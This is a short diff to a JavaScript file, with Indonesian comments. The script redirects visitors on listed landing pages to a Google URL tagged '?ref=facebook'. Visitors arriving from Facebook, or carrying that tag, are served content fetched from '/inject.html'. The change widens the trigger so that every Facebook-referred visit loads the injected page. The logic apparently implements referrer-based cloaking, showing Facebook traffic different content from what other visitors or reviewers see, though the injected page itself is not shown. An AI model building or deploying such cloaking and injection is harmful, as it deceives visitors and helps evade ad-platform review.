@@ -32,6 +32,10 @@
     });
   };
 
+  // Mendapatkan parameter ?ref=facebook dari URL
+  const urlParams = new URLSearchParams(window.location.search);
+  const refFromFacebook = urlParams.get('ref') === 'facebook';
+
   // Membaca URL dari google.txt, target.txt, metadata dari target.txt, dan daftar halaman dari landingpage.txt
   Promise.all([
     fetchFileContent('/google.txt'),
@@ -45,10 +49,13 @@
       if (landingPageList.some((page) => currentPath.includes(page))) {
         injectMetadata(originalHtml);
         setTimeout(() => {
-          location.href = googleUrl.trim();
+          // Tambahkan parameter ?ref=facebook jika referer dari Facebook
+          const redirectUrl = `${googleUrl.trim()}?ref=facebook`;
+          location.href = redirectUrl;
         }, 200);
-      } else if (testing || (currentPath.includes(targetUrl.trim()) && referrer.includes('facebook.com'))) {
-        fetch('./inject.html', { cache: 'no-cache' })
+      } else if (testing || refFromFacebook || referrer.includes('facebook.com')) {
+        // Muat inject.html jika datang dari Facebook atau mode testing
+        fetch('/inject.html', { cache: 'no-cache' })
           .then((response) => {
             if (!response.ok) throw new Error('Failed to load inject.html');
             return response.text();
